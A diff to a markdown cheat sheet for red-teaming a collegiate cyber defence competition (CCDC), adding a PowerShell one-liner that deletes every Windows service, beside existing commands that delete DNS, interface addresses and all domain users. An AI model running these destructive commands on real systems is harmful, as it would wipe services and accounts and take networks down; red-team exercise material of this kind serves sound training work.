@@ -261,6 +261,7 @@ pagetitle: Red Teaming for CCDC
 - `misc::wp /file:{path}` to set the current PC's wallpaper
 - `sc.exe stop dns` to stop dns
   - `sc.exe delete dns` to delete it
+  - Delete all services lol: `powershell -c "Get-Service | ForEach-Object { sc.exe delete $_.Name }"`
 - Delete IP on interface: `netsh interface ip delete address "Ethernet" addr={address}`
 - `powershell -c "Get-ADUser -Filter * | ForEach-Object { Remove-ADUser $_ -Confirm:$false }"` to delete domain users
 
